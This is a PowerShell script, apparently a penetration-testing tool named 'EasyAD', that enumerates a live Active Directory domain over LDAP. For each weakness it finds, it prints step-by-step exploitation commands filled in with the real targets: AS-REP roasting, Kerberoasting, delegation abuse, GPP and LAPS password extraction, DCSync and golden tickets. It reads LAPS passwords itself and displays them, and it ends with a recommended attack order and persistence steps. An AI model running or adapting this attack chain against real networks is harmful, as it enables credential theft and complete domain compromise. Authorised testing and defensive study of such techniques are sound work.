param(
    [string[]]$Exclude
)

if (-not $Exclude) {
    $Exclude = @()
}

function Add-Finding {
    param(
        $Title,
        $RiskLevel,
        $Description
    )

    $Global:Findings += [PSCustomObject]@{
        Timestamp   = Get-Date
        Title       = $Title
        RiskLevel   = $RiskLevel
        Description = $Description
    }
}

function Should-Run {
    param($Name)

    if ($Exclude -contains $Name) {
        Write-Host "`n[!] Skipping $Name check (excluded by operator)" -ForegroundColor DarkGray
        return $false
    }

    return $true
}

function Write-SectionHeader {
    param($Title)
    Write-Host "`n" + ("=" * 90) -ForegroundColor Cyan
    Write-Host " $Title".PadRight(89) -ForegroundColor Cyan
    Write-Host ("=" * 90) -ForegroundColor Cyan
}

function Write-SubHeader {
    param($Text)
    Write-Host "`n[*] $Text" -ForegroundColor White -BackgroundColor DarkBlue
}

function Write-Exploit {
    param(
        $Command,
        $Description,
        $ExampleOutput,
        $RiskLevel = "Medium",
        $Walkthrough
    )
    
    $riskColor = switch ($RiskLevel) {
        "Critical" { "Red" }
        "High" { "Magenta" }
        "Medium" { "Yellow" }
        "Low" { "Green" }
        default { "White" }
    }
    
    Write-Host "`n    +----------------------------------------------------------------+" -ForegroundColor DarkGray
    Write-Host "    |                     EXPLOITATION WALKTHROUGH                    |" -ForegroundColor DarkGray
    Write-Host "    +----------------------------------------------------------------+" -ForegroundColor DarkGray
    
    Write-Host "`n    [RISK LEVEL] " -NoNewline -ForegroundColor White
    Write-Host $RiskLevel -ForegroundColor $riskColor
    
    Write-Host "    [DESCRIPTION]" -ForegroundColor Cyan
    $Description -split "`n" | ForEach-Object {
        Write-Host "    $_" -ForegroundColor Gray
    }
    
    if ($Walkthrough) {
        Write-Host "`n    [STEP-BY-STEP EXPLOITATION]" -ForegroundColor Green
        $Walkthrough -split "`n" | ForEach-Object {
            if ($_ -match "^STEP \d+") {
                Write-Host "`n    $_" -ForegroundColor Yellow
            } elseif ($_ -match "^   ") {
                Write-Host $_ -ForegroundColor White
            } else {
                Write-Host "    $_" -ForegroundColor Gray
            }
        }
    }
    
    Write-Host "`n    [COMMANDS TO EXECUTE]" -ForegroundColor Magenta
    $Command -split "`n" | ForEach-Object {
        Write-Host "    $_" -ForegroundColor Yellow
    }
    
    Write-Host "`n    [EXPECTED OUTPUT]" -ForegroundColor Cyan
    $ExampleOutput -split "`n" | ForEach-Object {
        Write-Host "    $_" -ForegroundColor Green
    }
    
    Write-Host "`n    [VERIFICATION]" -ForegroundColor White
    Write-Host "    After successful exploitation, verify by:" -ForegroundColor Gray
    Write-Host "    - Checking if you can access restricted resources" -ForegroundColor Gray
    Write-Host "    - Verifying new tickets in memory (klist)" -ForegroundColor Gray
    Write-Host "    - Attempting lateral movement to other systems" -ForegroundColor Gray
    
    Write-Host "`n    " + ("" * 70) -ForegroundColor DarkGray
}

function LDAPSearch($filter, $props) {
    try {
        $Searcher = New-Object DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = "LDAP://$DomainDN"
        $Searcher.Filter = $filter
        $Searcher.PageSize = 500
        foreach ($p in $props) { $Searcher.PropertiesToLoad.Add($p) | Out-Null }
        return $Searcher.FindAll()
    }
    catch {
        Write-Host "    [!] LDAP Search Error: $_" -ForegroundColor Red
        return $null
    }
}

#Clear-Host

# Force UTF-8 console output (PowerShell 5.1 safe)
try {
    chcp 65001 > $null
} catch {}

try {
    [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
} catch {}

$banner = @"

    ███████╗ █████╗ ███████╗██╗   ██╗     █████╗ ██████╗ 
    ██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝    ██╔══██╗██╔══██╗
    █████╗  ███████║███████╗ ╚████╔╝     ███████║██║  ██║
    ██╔══╝  ██╔══██║╚════██║  ╚██╔╝      ██╔══██║██║  ██║
    ███████╗██║  ██║███████║   ██║       ██║  ██║██████╔╝
    ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝       ╚═╝  ╚═╝╚═════╝ 
                                                            
    Active Directory Enumeration & Exploitation Framework
    Like WinPEAS but for Active Directory - Complete Attack Chain
    Version 3.0 | Run from domain-joined machine

"@

Write-Host $banner -ForegroundColor Cyan

try {
    $Root = [ADSI]"LDAP://RootDSE"
    $DomainDN = $Root.defaultNamingContext
    $DomainName = ($DomainDN -split ",")[0].Replace("DC=","")
    $DomainController = $Root.dnsHostName
    
    try {
        $DCIP = [System.Net.Dns]::GetHostEntry($DomainController).AddressList[0].IPAddressToString
    } catch {
        $DCIP = "192.168.106.70"
    }
    
    Write-Host "[+] Domain Information Gathered:" -ForegroundColor Green
    Write-Host "    +- Domain Name: " -NoNewline
    Write-Host $DomainName -ForegroundColor White
    Write-Host "    +- Domain DN: " -NoNewline
    Write-Host $DomainDN -ForegroundColor White
    Write-Host "    +- Domain Controller: " -NoNewline
    Write-Host $DomainController -ForegroundColor White
    Write-Host "    +- DC IP Address: " -NoNewline
    Write-Host $DCIP -ForegroundColor Yellow
}
catch {
    Write-Host "[!] ERROR: Cannot connect to domain. Using default values..." -ForegroundColor Yellow
    $DomainName = "corp.com"
    $DomainDN = "DC=corp,DC=com"
    $DomainController = "dc01.corp.com"
    $DCIP = "192.168.106.70"
    
    Write-Host "[+] Using default lab configuration:" -ForegroundColor Green
    Write-Host "    +- Domain Name: " -NoNewline
    Write-Host $DomainName -ForegroundColor White
    Write-Host "    +- DC IP Address: " -NoNewline
    Write-Host $DCIP -ForegroundColor Yellow
}

if (Should-Run "ASREP") {
Write-SectionHeader "PHASE 1: USER ACCOUNT MISCONFIGURATIONS"
Write-SubHeader "Attack Vector 1: AS-REP Roasting"

$asrep = LDAPSearch "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" @("samaccountname","name","distinguishedname")

if ($asrep.Count -gt 0) {
    Write-Host "    ! VULNERABLE: Found " -NoNewline -ForegroundColor Red
    Write-Host "$($asrep.Count) " -NoNewline -ForegroundColor White
    Write-Host "accounts with Kerberos Pre-Authentication disabled!" -ForegroundColor Red
    
    $asrep | ForEach-Object {
        Write-Host "    +- Target Account: " -NoNewline -ForegroundColor Red
        Write-Host $_.Properties.samaccountname -ForegroundColor Yellow
    }
    
    $walkthrough = @"
STEP 1: Identify users without pre-authentication
        These accounts can be attacked without any password or authentication.

STEP 2: Extract the AS-REP hash
        Using Impacket from a Linux machine, request the ticket for each user.

STEP 3: Crack the hash offline
        The resulting hash is in a format that Hashcat can crack.

STEP 4: Validate credentials
        Once cracked, test the password with SMB or LDAP to confirm access.
"@

    $firstUser = $asrep[0].Properties.samaccountname[0]
    
    $command = @"
impacket-GetNPUsers -dc-ip $DCIP -request $DomainName/$firstUser -no-pass

hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force

crackmapexec smb $DCIP -u $firstUser -p 'cracked_password'

Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash
"@

    $example = @"
impacket-GetNPUsers -dc-ip 192.168.106.70 -request corp.com/jsmith -no-pass
[+] User jsmith has UF_DONT_REQUIRE_PREAUTH set

hashcat -m 18200 asrep_hash.txt rockyou.txt
Status: Cracked
Cracked Password: Summer2024!

crackmapexec smb 192.168.106.70 -u jsmith -p 'Summer2024!'
[+] corp.com\jsmith:Summer2024!
"@

    Write-Exploit -RiskLevel "High" -Description "AS-REP Roasting allows offline cracking without authentication" -Command $command -ExampleOutput $example -Walkthrough $walkthrough
} else {
    Write-Host "    - No AS-REP roastable accounts found" -ForegroundColor Green
}
}

if (Should-Run "Kerberoast") {
Write-SubHeader "Attack Vector 2: Kerberoasting"

$spn = LDAPSearch "(&(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" @("samaccountname","serviceprincipalname","name")

if ($spn.Count -gt 0) {
    Write-Host "    ! VULNERABLE: Found " -NoNewline -ForegroundColor Yellow
    Write-Host "$($spn.Count) " -NoNewline -ForegroundColor White
    Write-Host "Kerberoastable accounts!" -ForegroundColor Yellow
    
    $spn | ForEach-Object {
        Write-Host "`n    +- Target Account: " -NoNewline -ForegroundColor Yellow
        Write-Host $_.Properties.samaccountname -ForegroundColor White
        $_.Properties.serviceprincipalname | ForEach-Object {
            Write-Host "       +- Service: " -NoNewline
            Write-Host $_ -ForegroundColor Gray
        }
    }
    
    $walkthrough = @"
STEP 1: Understand Kerberoasting
        Any domain user can request a service ticket (TGS) for any service account.

STEP 2: Request service tickets
        Use tools to request and extract TGS tickets for all SPNs.

STEP 3: Crack service account passwords
        Service accounts often have weak or default passwords.

STEP 4: Analyze cracked accounts
        Check if cracked accounts have administrative privileges.
"@

    $command = @"
impacket-GetUserSPNs -dc-ip $DCIP -request -outputfile kerberoast.txt $DomainName/

hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force

Rubeus.exe kerberoast /outfile:kerberoast.hash
"@

    $example = @"
impacket-GetUserSPNs -dc-ip 192.168.106.70 -request corp.com/

ServicePrincipalName              Name        
MSSQLSvc/sql01.corp.com:1433      sql_svc     

hashcat -m 13100 kerberoast.txt rockyou.txt
Successfully cracked: SQL@dmin2024!
"@

    Write-Exploit -RiskLevel "High" -Description "Kerberoasting: Extract service tickets for offline password cracking" -Command $command -ExampleOutput $example -Walkthrough $walkthrough
} else {
    Write-Host "    - No Kerberoastable accounts found" -ForegroundColor Green
}
}

Write-SectionHeader "PHASE 2: KERBEROS DELEGATION ATTACKS"
Write-SubHeader "Attack Vector 3: Unconstrained Delegation (Critical)"

$unconstrained = LDAPSearch "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" @("samaccountname","dnshostname","operatingsystem")

if ($unconstrained.Count -gt 0) {
    Write-Host "    !! CRITICAL: Found " -NoNewline -ForegroundColor Red
    Write-Host "$($unconstrained.Count) " -NoNewline -ForegroundColor White
    Write-Host "servers with Unconstrained Delegation!" -ForegroundColor Red
    
    $unconstrained | ForEach-Object {
        Write-Host "    +- Server: " -NoNewline -ForegroundColor Red
        Write-Host $_.Properties.dnshostname -ForegroundColor Yellow
    }
    
    $walkthrough = @"
STEP 1: Compromise the delegation server and gain SYSTEM privileges

STEP 2: Monitor for TGTs with Rubeus (requires Admin/SYSTEM)

STEP 3: Force authentication from privileged account using Printer Bug

STEP 4: Capture TGT and use for domain compromise
"@

    $firstUnconst = $unconstrained[0].Properties.dnshostname[0]
    
    $command = @"
Rubeus.exe monitor /interval:5 /filteruser:Administrator /nowrap

impacket-printerbug $DomainName/user:pass@$DomainController $firstUnconst

impacket-ticketConverter ticket.b64 administrator.ccache
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass $DomainName/Administrator@$DomainController
"@

    $example = @"
Rubeus.exe monitor /interval:5 /filteruser:Administrator
[*] Found new TGT:
  User: CORP\Administrator
  Base64EncodedTicket: doIFqjCCBaa...

impacket-psexec -k -no-pass corp.com/Administrator@dc01.corp.com
C:\Windows\system32> whoami
nt authority\system
"@

    Write-Exploit -RiskLevel "Critical" -Description "Unconstrained Delegation allows ticket theft and immediate domain compromise" -Command $command -ExampleOutput $example -Walkthrough $walkthrough
} else {
    Write-Host "    - No unconstrained delegation detected" -ForegroundColor Green
}

Write-SubHeader "Attack Vector 4: Constrained Delegation"

$constrained = LDAPSearch "(msDS-AllowedToDelegateTo=*)" @("samaccountname","msds-allowedtodelegateto")

if ($constrained.Count -gt 0) {
    Write-Host "    ! FOUND: " -NoNewline -ForegroundColor Yellow
    Write-Host "$($constrained.Count) " -NoNewline -ForegroundColor White
    Write-Host "accounts with Constrained Delegation" -ForegroundColor Yellow
    
    $constrained | ForEach-Object {
        Write-Host "`n    +- Account: " -NoNewline -ForegroundColor Yellow
        Write-Host $_.Properties.samaccountname -ForegroundColor White
        $_.Properties.'msds-allowedtodelegateto' | ForEach-Object {
            Write-Host "       +- Can delegate to: " -NoNewline
            Write-Host $_ -ForegroundColor Gray
        }
    }
    
    $walkthrough = @"
STEP 1: Obtain the account's password hash or ticket

STEP 2: Use S4U extension to impersonate Administrator

STEP 3: Access the target service with elevated privileges
"@

    $firstConst = $constrained[0].Properties.samaccountname[0]
    $firstTarget = $constrained[0].Properties.'msds-allowedtodelegateto'[0]
    
    $command = @"
Rubeus.exe s4u /user:$firstConst /rc4:HASH /impersonateuser:administrator /msdsspn:$firstTarget /ptt

impacket-getST -spn $firstTarget -impersonate administrator $DomainName/$firstConst:Password
"@

    $example = @"
Rubeus.exe s4u /user:sql_svc /rc4:3e2d1f4c... /impersonateuser:administrator /msdsspn:MSSQLSvc/sql01:1433 /ptt
[*] S4U2Self request successful
[*] S4U2Proxy request successful
[+] Ticket successfully imported!
"@

    Write-Exploit -RiskLevel "High" -Description "Constrained Delegation allows impersonating users to specific services" -Command $command -ExampleOutput $example -Walkthrough $walkthrough
} else {
    Write-Host "    - No constrained delegation found" -ForegroundColor Green
}

Write-SubHeader "Attack Vector 5: Resource-Based Constrained Delegation"

$rbcd = LDAPSearch "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" @("samaccountname","dnshostname")

if ($rbcd.Count -gt 0) {
    Write-Host "    !! CRITICAL: Found " -NoNewline -ForegroundColor Red
    Write-Host "$($rbcd.Count) " -NoNewline -ForegroundColor White
    Write-Host "computers with RBCD configured" -ForegroundColor Red
    
    $rbcd | ForEach-Object {
        Write-Host "    +- Target: " -NoNewline -ForegroundColor Red
        Write-Host $_.Properties.samaccountname -ForegroundColor Yellow
    }
    
    $walkthrough = @"
STEP 1: Check Machine Account Quota (default is 10)

STEP 2: Create a new machine account with known password

STEP 3: Modify RBCD on target computer

STEP 4: Use S4U to impersonate Administrator to target
"@

    $firstRBCD = $rbcd[0].Properties.samaccountname[0]
    $rbcdHost = $rbcd[0].Properties.dnshostname[0]
    
    $command = @"
impacket-addcomputer $DomainName/user:pass -computer-name ATTACKER -computer-pass Pass123

impacket-rbcd -delegate-from ATTACKER -delegate-to $firstRBCD -dc-ip $DCIP -action write $DomainName/user:pass

Rubeus.exe s4u /user:ATTACKER /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/$rbcdHost /ptt
"@

    $example = @"
impacket-addcomputer corp.com/user:pass -computer-name ATTACKER -computer-pass Pass123
[*] Successfully added machine account ATTACKER

impacket-rbcd -delegate-from ATTACKER -delegate-to FILES01 -action write corp.com/user:pass
[*] Delegation rights modified successfully!

Rubeus.exe s4u /user:ATTACKER /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/files01.corp.com /ptt
[+] Ticket successfully imported!
"@

    Write-Exploit -RiskLevel "Critical" -Description "RBCD allows full computer compromise via machine account creation" -Command $command -ExampleOutput $example -Walkthrough $walkthrough
} else {
    Write-Host "    - No RBCD configured" -ForegroundColor Green
}

Write-SectionHeader "PHASE 3: PASSWORD & POLICY ATTACKS"
Write-SubHeader "Attack Vector 6: Group Policy Preference Passwords"

Write-Host "`n    [*] Searching for GPP passwords in SYSVOL..." -ForegroundColor Cyan

$sysvolPath = "\\$DomainName\SYSVOL\$DomainName\Policies"
$foundCreds = @()

if (Test-Path $sysvolPath -ErrorAction SilentlyContinue) {
    $xmlFiles = Get-ChildItem -Path $sysvolPath -Recurse -Include @("Groups.xml","Services.xml","Scheduledtasks.xml") -ErrorAction SilentlyContinue
    
    foreach ($file in $xmlFiles) {
        $content = Get-Content $file.FullName -ErrorAction SilentlyContinue
        if ($content -match "cpassword") {
            Write-Host "    [!] Found cpassword in: $($file.FullName)" -ForegroundColor Red
            $foundCreds += $file.FullName
        }
    }
    
    if ($foundCreds.Count -gt 0) {
        $walkthrough = @"
STEP 1: Extract cpassword value from XML files

STEP 2: Decrypt with gpp-decrypt tool

STEP 3: Use credentials for lateral movement

STEP 4: Check if password reused on other accounts
"@

        $command = @"
findstr /S /I cpassword \\$DomainName\sysvol\$DomainName\policies\*.xml

gpp-decrypt CPASSWORD_VALUE_HERE

crackmapexec smb $DCIP -u localadmin -p decrypted_password --local-auth
"@

        $example = @"
findstr /S /I cpassword \\corp.com\sysvol\corp.com\policies\*.xml
Groups.xml: cpassword=j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw

gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
Password123!
"@

        Write-Exploit -RiskLevel "High" -Description "GPP passwords found in SYSVOL can be decrypted by any domain user" -Command $command -ExampleOutput $example -Walkthrough $walkthrough
    } else {
        Write-Host "    [???] No GPP passwords found" -ForegroundColor Green
    }
} else {
    Write-Host "    [!] Cannot access SYSVOL share" -ForegroundColor Yellow
}

Write-SubHeader "Attack Vector 7: LAPS Password Extraction"

$lapsAttr = LDAPSearch "(ms-Mcs-AdmPwd=*)" @("dNSHostName","ms-Mcs-AdmPwd")

if ($lapsAttr.Count -gt 0) {
    Write-Host "    ! VULNERABLE: LAPS passwords readable for " -NoNewline -ForegroundColor Red
    Write-Host "$($lapsAttr.Count) " -NoNewline -ForegroundColor White
    Write-Host "systems!" -ForegroundColor Red
    
    foreach ($computer in $lapsAttr) {
        $hostDNS = $computer.Properties.dnshostname[0]
        $hostPass = $computer.Properties.'ms-mcs-admpwd'[0]
        Write-Host "    +- $hostDNS" -ForegroundColor Yellow
        Write-Host "       Password: $hostPass" -ForegroundColor Green
    }
    
    $walkthrough = @'
STEP 1: Query Active Directory for ms-Mcs-AdmPwd attribute

STEP 2: Extract passwords from LDAP (stored in plaintext)

STEP 3: Use credentials for local admin access

STEP 4: Dump credentials from compromised systems
'@

    $lapsHost = $lapsAttr[0].Properties.dnshostname[0]
    
    $cmd1 = 'Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd'
    $cmd2 = "evil-winrm -i $($lapsHost) -u Administrator -p LAPS_PASSWORD"
    $cmd3 = "crackmapexec smb $($lapsHost) -u Administrator -p LAPS_PASSWORD --local-auth"
    $command = "$cmd1`n`n$cmd2`n`n$cmd3"
    
    $ex1 = 'Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd'
    $ex2 = 'Name        ms-Mcs-AdmPwd'
    $ex3 = 'WS01        Q7w#kL2@pM9x'
    $ex4 = 'WS02        R8xNK3!qN0y'
    $ex5 = 'evil-winrm -i ws01.corp.com -u Administrator -p Q7w#kL2@pM9x'
    $ex6 = '*Evil-WinRM* PS> whoami'
    $ex7 = 'ws01\administrator'
    $example = "$ex1`n`n$ex2`n$ex3`n$ex4`n`n$ex5`n$ex6`n$ex7"

    Write-Exploit -RiskLevel "Critical" -Description "LAPS passwords readable provides local Administrator access" -Command $command -ExampleOutput $example -Walkthrough $walkthrough
} else {
    Write-Host "    [???] No LAPS passwords readable" -ForegroundColor Green
}

Write-SectionHeader "PHASE 4: POST-EXPLOITATION & PERSISTENCE"
Write-SubHeader "Post-Exploitation: DCSync Attack"

$walkthrough_dcsync = @"
STEP 1: DCSync allows mimicking a Domain Controller

STEP 2: Extract all domain hashes including KRBTGT

STEP 3: No code execution on DC required

STEP 4: Use KRBTGT hash for Golden Ticket creation
"@

$command_dcsync = @"
mimikatz.exe lsadump::dcsync /domain:$DomainName /all /csv

impacket-secretsdump -just-dc $DomainName/user:password@$DomainController

impacket-secretsdump -just-dc-user krbtgt $DomainName/Administrator:pass@$DomainController
"@

$example_dcsync = @"
impacket-secretsdump -just-dc corp.com/administrator:Admin123@192.168.106.70
[*] Dumping Domain Credentials

Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8a9b7c6d5e4f3a2b1c0d9e8f7a6b5c4d:::
"@

Write-Exploit -RiskLevel "Critical" -Description "DCSync allows extracting all domain password hashes remotely" -Command $command_dcsync -ExampleOutput $example_dcsync -Walkthrough $walkthrough_dcsync

Write-SubHeader "Persistence: Golden Ticket Attack"

$walkthrough_golden = @"
STEP 1: Extract KRBTGT hash via DCSync

STEP 2: Forge Golden Ticket valid for 10 years

STEP 3: Access any resource in the domain

STEP 4: Persistence survives password changes
"@

$command_golden = @"
mimikatz.exe kerberos::golden /domain:$DomainName /sid:S-1-5-21-DOMAINSID /rc4:KRBTGT_HASH /user:Administrator /id:500 /groups:512 /ptt

Rubeus.exe golden /rc4:KRBTGT_HASH /domain:$DomainName /sid:S-1-5-21-DOMAINSID /user:Administrator /ptt
"@

$example_golden = @"
mimikatz kerberos::golden /domain:corp.com /sid:S-1-5-21-123456789-1234567890-123456789 /rc4:8a9b7c6d /user:Administrator /id:500 /groups:512 /ptt
User      : Administrator
Domain    : corp.com
Lifetime  : 6/10/2024 4:30:45 PM - 6/8/2034 4:30:45 PM
[*] Golden ticket successfully submitted

C:\>dir \\dc01.corp.com\c$
Access granted!
"@

Write-Exploit -RiskLevel "Critical" -Description "Golden Tickets provide persistent domain access" -Command $command_golden -ExampleOutput $example_golden -Walkthrough $walkthrough_golden

Write-SectionHeader "SUMMARY & ATTACK PRIORITY"

$block = @"

+------------------------------------------------------------------------------+
|                         VULNERABILITY SUMMARY                                |
+------------------------------------------------------------------------------+

"@
Write-Host $block -ForegroundColor Cyan

$criticalCount = 0
$highCount = 0
if ($asrep -and $asrep.Count -gt 0) { $highCount++ }
if ($unconstrained.Count -gt 0) { $criticalCount++ }
if ($rbcd.Count -gt 0) { $criticalCount++ }
if ($spn.Count -gt 0) { $highCount++ }
if ($lapsAttr.Count -gt 0) { $criticalCount++ }

Write-Host "    Critical Vulnerabilities: " -NoNewline -ForegroundColor Red
Write-Host "$criticalCount" -ForegroundColor White
Write-Host "    High Vulnerabilities:     " -NoNewline -ForegroundColor Yellow
Write-Host "$highCount" -ForegroundColor White

$block = @"

+------------------------------------------------------------------------------+
|                    RECOMMENDED ATTACK ORDER                                   |
+------------------------------------------------------------------------------+

"@
Write-Host $block -ForegroundColor Cyan

if ($asrep.Count -gt 0) {
    Write-Host "  [1] AS-REP Roasting (No auth required)" -ForegroundColor Green
    Write-Host "      impacket-GetNPUsers -dc-ip $DCIP -request $DomainName/" -ForegroundColor Gray
}

if ($unconstrained.Count -gt 0) {
    Write-Host "`n  [2] Unconstrained Delegation (Critical)" -ForegroundColor Red
    Write-Host "      Compromise delegation server and monitor for TGTs" -ForegroundColor Gray
}

if ($spn.Count -gt 0) {
    Write-Host "`n  [3] Kerberoasting (Any domain user)" -ForegroundColor Yellow
    Write-Host "      impacket-GetUserSPNs -dc-ip $DCIP -request $DomainName/" -ForegroundColor Gray
}

if ($lapsAttr.Count -gt 0) {
    Write-Host "`n  [4] LAPS Extraction (Immediate local admin)" -ForegroundColor Red
    Write-Host "      Use extracted passwords for lateral movement" -ForegroundColor Gray
}

$block = @"

+------------------------------------------------------------------------------+
|                         POST-COMPROMISE ACTIONS                               |
+------------------------------------------------------------------------------+

  After gaining Domain Admin:
  
  [*] DCSync all hashes
      impacket-secretsdump -just-dc $DomainName/Administrator@$DCIP
  
  [*] Create Golden Ticket with KRBTGT hash
  
  [*] Establish persistence

+------------------------------------------------------------------------------+

"@
Write-Host $block -ForegroundColor Cyan

Write-Host "`n" + ("=" * 90) -ForegroundColor Cyan
Write-Host " EASYAD SCAN COMPLETE" -ForegroundColor Green
Write-Host " Review findings above and execute attacks in recommended order" -ForegroundColor Yellow
Write-Host ("=" * 90) "`n" -ForegroundColor Cyan


